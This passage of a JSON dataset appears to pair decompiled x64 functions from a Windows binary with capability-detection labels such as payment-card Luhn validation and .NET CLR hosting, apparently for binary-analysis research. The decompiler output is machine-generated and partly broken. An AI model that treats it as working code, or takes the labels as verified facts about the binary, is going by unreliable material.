uVar49;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n        uVar40 = *piVar60;\n        *piVar60 = *piVar60 + uVar41;\n        *(piVar60 + 1) = *(piVar60 + 1) + uVar49 + CARRY1(uVar40, uVar41);\n        *piVar60 = *piVar60 + uVar41;\n        *piVar60 = *piVar60 + uVar41;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xec:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xed:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xee:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xef:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf0:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf1:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf5:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf6:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf7:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf8:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xf9:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfa:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfb:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    case 0xfc:\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    in_stack_00000058 = &stack0x00000068;\n    piStack24 = &stack0x00000058;\n    in_stack_00000060 = NULL;\n    in_stack_00000068 = 0;\n    puVar57 = in_stack_00000058;\n    fcn.1400acbc0(piStack24, unaff_R15 * 2);\n    piVar88 = unaff_RSI[2];\n    puVar84 = &stack0x00000030 + 4;\n    do {\n        if (*puVar84 < 5) {\n            UNRECOVERED_JUMPTABLE._0_8_ = *(*puVar84 * 4 + 0x14010b390) + 0x14010b390;\n            goto code_r0x000140044f88;\n        }\n        puVar84 = puVar84 + 1;\n    } while (CONCAT44(iStack44, CONCAT22(iStack46, uStack48)) != puVar84);\n    if (1 < UNRECOVERED_JUMPTABLE._0_8_) {\n        UNRECOVERED_JUMPTABLE._0_8_ = UNRECOVERED_JUMPTABLE._0_8_ - 1;\n        if (0x1fffffffffffffff - in_stack_00000060 < UNRECOVERED_JUMPTABLE._0_8_) {\ncode_r0x0001400454c4:\n            fcn.1400bd360(0x14010b302);\n            unaff_R14 = UNRECOVERED_JUMPTABLE._0_8_;\ncode_r0x0001400454d0:\n            fcn.1400bd360(0x14010b302);\n            ppiVar86 = unaff_R14;\ncode_r0x0001400454dc:\n            uVar56 = fcn.1400b7b60(0x14010b358, 0x14010b344, ppiVar86, ppiVar59);\n            fcn.1400bc860(uVar56);\n            (*(*arg1)[1])(arg1);\n            do {\n                uVar56 = fcn.1400bcd60();\n                fcn.1400bc860(uVar56);\n            } while( true );\n        }\n        fcn.1400acd00(piStack24, piStack16 + 2, UNRECOVERED_JUMPTABLE._0_8_);\n    }\n    piVar81 = in_stack_00000060;\n    if (in_stack_00000060 < piVar88) {\n        piVar81 = piVar88;\n        if (puStackX16 == 0x20) {\n            fcn.1400ab0f0(piStack24, in_stack_00000060, 0, piVar88 - in_stack_00000060);\n        }\n        else {\n            fcn.1400ab0f0(piStack24, 0, 0, piVar88 - in_stack_00000060);\n        }\n    }\n    uVar55 = unaff_R13 & 0xffffffff;\n    if ((unaff_R13 == '\\0') &&\n       (iVar58 = (**(*piStack56 + 0x60))(piStack56, in_stack_00000058, piVar81),  piVar81 != iVar58)) {\n        uVar55 = 1;\n    }\n    if (in_stack_00000058 != puVar57) {\n        fcn.1400bc6c0(in_stack_00000058);\n    }\n    if (CONCAT62(in_stack_0000003a, in_stack_00000038) != in_stack_00000000) {\n        fcn.1400bc6c0();\n    }\n    unaff_RSI[2] = NULL;\n    in_stack_000000c8[1] = unaff_R13 & 0xffffffffffffff00 | uVar55 & 0xff;\n    *in_stack_000000c8 = piStack56;\n    return in_stack_000000c8;\ncode_r0x00014003a6a9:\n    arg3 = *(ppuVar76 + 600);\n    ppiVar59 = ppuVar76 + 0x90;\n    puVar63 = ppuVar76 + 0xb0;\n    in_stack_00000030 = ppuVar76 + 0xa0;\n    iVar58 = *(*(ppuVar76 + 0x80) + 0x10);\n    uVar1 = *(iVar58 + 0xa8);\n    uVar5 = *(iVar58 + 0xac);\n    uVar6 = *(iVar58 + 0xb0);\n    uVar7 = *(iVar58 + 0xb4);\n    in_XMM5_Da = *(iVar58 + 0x68);\n    in_XMM5_Db = *(iVar58 + 0x6c);\n    in_XMM5_Dc = *(iVar58 + 0x70);\n    in_XMM5_Dd = *(iVar58 + 0x74);\n    in_XMM4_Da = *(iVar58 + 0x78);\n    in_XMM4_Db = *(iVar58 + 0x7c);\n    in_XMM4_Dc = *(iVar58 + 0x80);\n    in_XMM4_Dd = *(iVar58 + 0x84);\n    in_XMM3_Da = *(iVar58 + 0x88);\n    in_XMM3_Db = *(iVar58 + 0x8c);\n    in_XMM3_Dc = *(iVar58 + 0x90);\n    in_XMM3_Dd = *(iVar58 + 0x94);\n    piVar88 = *(iVar58 + 0x98);\n    piVar81 = *(iVar58 + 0xa0);\n    auVar90 = *(iVar58 + 0xb8);\n    in_XMM6_Da = *(iVar58 + 0x58);\n    in_XMM6_Db = *(iVar58 + 0x5c);\n    in_XMM6_Dc = *(iVar58 + 0x60);\n    in_XMM6_Dd = *(iVar58 + 100);\n    *(ppuVar76 + 0x30) = 0xe;\n    *(ppuVar76 + 0x130) = uVar1;\n    *(ppuVar76 + 0x134) = uVar5;\n    *(ppuVar76 + 0x138) = uVar6;\n    *(ppuVar76 + 0x13c) = uVar7;\n    in_XMM1_Da = *(ppuVar76 + 0xc0);\n    in_XMM1_Db = *(ppuVar76 + 0xc4);\n    in_XMM1_Dc = *(ppuVar76 + 200);\n    in_XMM1_Dd = *(ppuVar76 + 0xcc);\n    *(ppuVar76 + 0x98) = *(ppuVar76 + 0x78);\n    *(ppuVar76 + 0x40) = ppuVar76 + 0xd8;\n    *(ppuVar76 + 0x90) = unaff_RDI;\n    *(ppuVar76 + 0x38) = *(ppuVar76 + 0x270);\n    *(ppuVar76 + 0x28) = ppuVar76 + 0xe0;\n    UNRECOVERED_JUMPTABLE._0_8_ = ppuVar76 + 0xdc;\n    ppuVar75 = ppuVar76;\n    goto code_r0x00014003a762;\ncode_r0x000140039f66:\n    *(ppuVar76 + 100) = 4;\n    ppiVar59 = *(ppuVar76 + 0xc0);\n    *(ppuVar76 + 0xd8) = 4;\n    goto code_r0x000140039f81;\ncode_r0x000140040532:\n    uVar4 = in_stack_00000080;\n    uVar55 = in_stack_00000080 + 1;\n    cVar39 = *(*unaff_R15 + (UNRECOVERED_JUMPTABLE._0_8_ - piStack16 >> 1));\n    uVar67 = CONCAT71(in_stack_00000089, in_stack_00000088);\n    if (in_stack_00000078 == piStack24) {\n        uVar67 = 0xf;\n    }\n    if (uVar67 < uVar55) {\n        fcn.1400a9390(puStackX32, in_stack_00000080, 0, 0);\n    }\n    *(in_stack_00000078 + uVar4) = cVar39;\n    iStack44 = iStack44 + 1;\n    *(in_stack_00000078 + uVar4 + 1) = '\\0';\n    in_stack_00000080 = uVar55;\ncode_r0x000140040596:\n    piVar88 = arg1[2];\n    if (piVar88 < arg1[3]) {\ncode_r0x0001400405a4:\n        arg1[2] = piVar88 + 2;\n    }\n    else {\ncode_r0x0001400407eb:\n        (*(*arg1)[10])(arg1);\n    }\n    unaff_RDI = 0xffffffff;\n    unaff_R13 = 0x1;\n    cVar39 = '\\x01';\n    unaff_R12 = arg1 != NULL;\n    if (arg1 != NULL) {\n        if (arg1[2] < arg1[3]) {\n            iVar45 = *arg1[2];\n        }\n        else {\n            iVar45 = (*(*arg1)[9])(arg1);\n        }\n        if (iVar45 == -1) {\n            arg1 = NULL;\n        }\n        else {\n            unaff_R12 = NULL;\n        }\n    }\n    else {\n        unaff_R12 = 0x1;\n    }\n    UNRECOVERED_JUMPTABLE._0_8_ = iStack46 == -1;\n    bVar89 = unaff_RBP != NULL && iStack46 == -1;\n    if (bVar89) {\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar45 = *unaff_RBP[2];\n        }\n        else {\n            iVar45 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n        }\n        if (iVar45 == -1) {\n            unaff_RBP = NULL;\n        }\n        if (SUB81(unaff_R12, 0) == (iVar45 == -1 && bVar89)) {\ncode_r0x0001400408a0:\n            uVar44 = unaff_RDI;\n            uVar40 = 1;\njoined_r0x0001400408af:\n            if (in_stack_00000080 != 0) goto code_r0x00014004060d;\n            goto code_r0x0001400408b5;\n        }\n    }\n    else {\ncode_r0x0001400404fc:\n        cVar39 = unaff_R13;\n        if (unaff_R12 == UNRECOVERED_JUMPTABLE._0_8_) goto code_r0x0001400408a0;\n    }\n    if ((arg1 != NULL) && (cVar39 != '\\0')) goto code_r0x0001400405c0;\n    uVar55 = unaff_RDI & 0xffffffff;\n    goto code_r0x000140040515;\ncode_r0x000140041872:\n    uVar4 = in_stack_00000080;\n    uVar55 = in_stack_00000080 + 1;\n    cVar39 = *(*unaff_R15 + (UNRECOVERED_JUMPTABLE._0_8_ - piStack16 >> 1));\n    uVar67 = CONCAT71(in_stack_00000089, in_stack_00000088);\n    if (in_stack_00000078 == piStack24) {\n        uVar67 = 0xf;\n    }\n    if (uVar67 < uVar55) {\n        fcn.1400a9390(puStackX32, in_stack_00000080, 0, 0);\n    }\n    *(in_stack_00000078 + uVar4) = cVar39;\n    iStack44 = iStack44 + 1;\n    *(in_stack_00000078 + uVar4 + 1) = '\\0';\n    in_stack_00000080 = uVar55;\ncode_r0x0001400418d6:\n    piVar88 = arg1[2];\n    if (piVar88 < arg1[3]) {\ncode_r0x0001400418e4:\n        arg1[2] = piVar88 + 2;\n    }\n    else {\ncode_r0x000140041b2b:\n        (*(*arg1)[10])(arg1);\n    }\n    unaff_RDI = 0xffffffff;\n    bVar89 = arg1 != NULL;\n    if (bVar89) {\n        if (arg1[2] < arg1[3]) {\n            iVar45 = *arg1[2];\n        }\n        else {\n            iVar45 = (*(*arg1)[9])(arg1);\n        }\n        if (iVar45 == -1) {\n            arg1 = NULL;\n        }\n        bVar89 = iVar45 == -1 && bVar89;\n    }\n    else {\n        bVar89 = true;\n    }\n    bVar79 = iStack46 == -1;\n    bVar82 = unaff_RBP != NULL && bVar79;\n    if (bVar82) {\n        if (unaff_RBP[2] < unaff_RBP[3]) {\n            iVar45 = *unaff_RBP[2];\n        }\n        else {\n            iVar45 = (**(*unaff_RBP + 0x48))(unaff_RBP);\n        }\n        bVar79 = iVar45 == -1 && bVar82;\n        if (iVar45 == -1) {\n            unaff_RBP = NULL;\n        }\n    }\n    if (bVar89 == bVar79) {\ncode_r0x000140041be0:\n        uVar44 = unaff_RDI;\n        uVar40 = 1;\njoined_r0x000140041bef:\n        if (in_stack_00000080 != 0) goto code_r0x00014004194d;\n        goto code_r0x000140041bf5;\n    }\n    if (arg1 != NULL) {\n        bVar89 = false;\ncode_r0x00014004184d:\n        if (!bVar89) goto code_r0x000140041900;\n    }\n    arg3 = unaff_RDI & 0xffffffff;\n    goto code_r0x000140041855;\ncode_r0x000140041900:\n    if (arg1[2] < arg1[3]) {\n        arg3 = *arg1[2];\n    }\n    else {\n        uVar49 = (*(*arg1)[9])(arg1);\n        arg3 = uVar49;\n    }\n    goto code_r0x000140041911;\n}\n",
        "token_count": 58642
    },
    "1400b3b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3b40(ulong *arg1)\n\n{\n    *arg1 = 0x1401195b0;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 51
    },
    "1400b0ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b0ee0(ulong *arg1)\n\n{\n    *arg1 = 0x1401173e0;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 51
    },
    "1400b3d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b3d10(ulong *arg1)\n\n{\n    *arg1 = 0x1401195f0;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 51
    },
    "1400b10b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b10b0(ulong *arg1)\n\n{\n    *arg1 = 0x140117420;\n    fcn.1400a5760(arg1 + 2);\n    return;\n}\n",
        "token_count": 49
    },
    "1400b407": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b4070(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140110730 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x14009de20) {\n            fcn.14009de50(arg1_00);\n            fcn.1400bc6c0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "1400b144": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b1440(int64_t *arg1)\n\n{\n    *arg1 = *0x140110370 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "1400b443": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b4430(int64_t *arg1)\n\n{\n    int64_t *arg1_00;\n    \n    arg1_00 = arg1[2];\n    *arg1 = *0x140110740 + 0x10;\n    if (arg1_00 != NULL) {\n        if (*(*arg1_00 + 8) == 0x14009e450) {\n            fcn.14009e480(arg1_00);\n            fcn.1400bc6c0(arg1_00);\n        }\n        else {\n            (**(*arg1_00 + 8))();\n        }\n    }\n    return;\n}\n",
        "token_count": 143
    },
    "1400b17f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400b17f0(int64_t *arg1)\n\n{\n    *arg1 = *0x140110380 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "1400a5f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a5f60(int64_t *arg1)\n\n{\n    *arg1 = *0x140110310 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "1400a632": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a6320(int64_t *arg1)\n\n{\n    *arg1 = *0x140110320 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "1400a66f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a66f0(int64_t *arg1)\n\n{\n    *arg1 = *0x140110330 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "1400a6ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400a6ac0(int64_t *arg1)\n\n{\n    *arg1 = *0x140110340 + 0x10;\n    if (arg1[2] != NULL) {\n        (**(*arg1[2] + 8))();\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "140086eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140086eb0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_R9;\n    uchar uStack33;\n    int64_t aiStack32 [2];\n    \n    aiStack32[0] = fcn.14007b9e0(arg3, arg3 + in_R9);\n    uVar3 = (**(*arg2 + 0x10))(arg2, aiStack32);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack32[0] + -8);\n        *(aiStack32[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack32[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.14007bf10(aiStack32[0] + -0x18, &uStack33);\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 279
    },
    "140086f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140086f60(ulong noname_0, int64_t *arg2, int64_t *arg3, int64_t arg4)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    int64_t *arg1;\n    ulong in_stack_00000028;\n    uchar uStack121;\n    int64_t iStack120;\n    ulong uStack104;\n    uchar *puStack96;\n    uchar *puStack56;\n    uchar auStack40 [16];\n    \n    puStack56 = &stack0xffffffffffffffd8;\n    if ((arg3 != NULL) || (arg4 == 0)) {\n        puStack96 = 0x140086f92;\n        fcn.1400a7220(&stack0xffffffffffffffc8, arg3, arg3 + arg4);\n        puStack96 = 0x140086fa6;\n        uVar3 = (**(*arg2 + 0x10))(arg2, &stack0xffffffffffffffc8, in_stack_00000028);\n        if (puStack56 != &stack0xffffffffffffffd8) {\n            puStack96 = 0x140086fb7;\n            fcn.1400bc6c0();\n        }\n        return uVar3;\n    }\n    puStack96 = 0x140086fc6;\n    arg1 = arg3;\n    uStack104 = fcn.1400a9dd0();\n    if (puStack56 != &stack0xffffffffffffffd8) {\n        puStack96 = 0x140086fd8;\n        fcn.1400bc6c0();\n    }\n    puStack96 = 0x140086fe0;\n    fcn.140014f30(uStack104);\n    puStack96 = &stack0xffffffffffffffd8;\n    iStack120 = fcn.14007b9e0(arg1, arg1 + arg4);\n    uVar4 = (**(*arg3 + 0x10))(arg3, &stack0xffffffffffffff88);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(iStack120 + -8);\n        *(iStack120 + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = iStack120 + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar4;\n    }\n    fcn.14007bf10(iStack120 + -0x18, &stack0xffffffffffffff87);\n    return uVar4 & 0xffffffff;\n}\n",
        "token_count": 598
    },
    "140086ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140086ff0(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_R9;\n    uchar uStack33;\n    int64_t aiStack32 [2];\n    \n    aiStack32[0] = fcn.14007b9e0(arg3, arg3 + in_R9);\n    uVar3 = (**(*arg2 + 0x10))(arg2, aiStack32);\n    if (**0x14010fc90 == 0) {\n        iVar2 = *(aiStack32[0] + -8);\n        *(aiStack32[0] + -8) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack32[0] + -8;\n        iVar2 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar2) {\n        return uVar3;\n    }\n    fcn.14007bf10(aiStack32[0] + -0x18, &uStack33);\n    return uVar3 & 0xffffffff;\n}\n",
        "token_count": 279
    },
    "1400870a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.1400870a0(ulong noname_0, int64_t *arg2, int64_t *arg3, int64_t arg4)\n\n{\n    uint32_t uVar1;\n    ulong arg1;\n    uint64_t uVar2;\n    int64_t *piVar3;\n    ulong in_stack_00000028;\n    uchar *apuStack56 [2];\n    uchar auStack40 [16];\n    \n    apuStack56[0] = auStack40;\n    if ((arg3 == NULL) && (arg4 != 0)) {\n        piVar3 = arg3;\n        arg1 = fcn.1400a9dd0();\n        if (apuStack56[0] != auStack40) {\n            fcn.1400bc6c0();\n        }\n        fcn.140014f30(arg1);\n    // WARNING: Could not recover jumptable at 0x000140087139. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(*arg3 + 0x20))(arg3, piVar3 & 0xffffffff);\n        return uVar2;\n    }\n    fcn.1400a7220(apuStack56, arg3, arg3 + arg4);\n    uVar1 = (**(*arg2 + 0x10))(arg2, apuStack56, in_stack_00000028);\n    if (apuStack56[0] != auStack40) {\n        fcn.1400bc6c0();\n    }\n    return uVar1;\n}\n",
        "token_count": 347
    },
    "1400872f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400872f0(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong in_stack_00000028;\n    uchar *puStack40;\n    int64_t iStack32;\n    uchar auStack24 [16];\n    \n    (**(*arg2 + 0x18))(&puStack40, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400a7550(arg3, puStack40, puStack40 + iStack32);\n    arg3[4] = 0x140086870;\n    if (puStack40 != auStack24) {\n        fcn.1400bc6c0();\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "14008748": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140087480(ulong noname_0, int64_t *arg2, int64_t *arg3, ulong arg4)\n\n{\n    ulong in_stack_00000028;\n    uchar *puStack40;\n    int64_t iStack32;\n    uchar auStack24 [16];\n    \n    (**(*arg2 + 0x18))(&puStack40, arg2, arg4, in_stack_00000028);\n    if (arg3[4] != NULL) {\n        (*arg3[4])(arg3);\n    }\n    *arg3 = arg3 + 2;\n    fcn.1400aaf70(arg3, puStack40, puStack40 + iStack32 * 2);\n    arg3[4] = 0x1400868f0;\n    if (puStack40 != auStack24) {\n        fcn.1400bc6c0();\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "14008755": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140087550(ulong noname_0, int64_t *arg2, int64_t arg3)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    uchar uVar5;\n    int64_t iVar6;\n    uchar uStack65;\n    int64_t aiStack64 [2];\n    \n    uVar5 = (**(*arg2 + 0x10))(arg2);\n    *(arg3 + 0x48) = uVar5;\n    uVar5 = (**(*arg2 + 0x18))(arg2);\n    *(arg3 + 0x88) = 1;\n    *(arg3 + 0x49) = uVar5;\n    iVar4 = *arg2;\n    *(arg3 + 0x10) = 0;\n    *(arg3 + 0x28) = 0;\n    *(arg3 + 0x38) = 0;\n    (**(iVar4 + 0x20))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar6 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar6, iVar4, 0);\n    *(iVar6 + iVar4) = 0;\n    *(arg3 + 0x18) = iVar4;\n    piVar1 = *0x14010fc90;\n    *(arg3 + 0x10) = iVar6;\n    if (*piVar1 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x28))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar6 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar6, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar6 + iVar4) = 0;\n    *(arg3 + 0x28) = iVar6;\n    *(arg3 + 0x30) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar2 = aiStack64[0] + -8;\n        iVar3 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n    }\n    if (iVar3 < 1) {\n        fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    }\n    (**(*arg2 + 0x30))(aiStack64, arg2);\n    iVar4 = *(aiStack64[0] + -0x18);\n    iVar6 = fcn.1400bc6e0(iVar4 + 1);\n    fcn.140024ea0(aiStack64, iVar6, iVar4, 0);\n    iVar3 = *piVar1;\n    *(iVar6 + iVar4) = 0;\n    *(arg3 + 0x38) = iVar6;\n    *(arg3 + 0x40) = iVar4;\n    if (iVar3 == 0) {\n        iVar3 = *(aiStack64[0] + -8);\n        *(aiStack64[0] + -8) = iVar3 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = aiStack64[0] + -8;\n        iVar3 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n    }\n    if (0 < iVar3) {\n        return;\n    }\n    fcn.14007bf10(aiStack64[0] + -0x18, &uStack65);\n    return;\n}\n",
        "token_count": 994
    },
    "140087d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
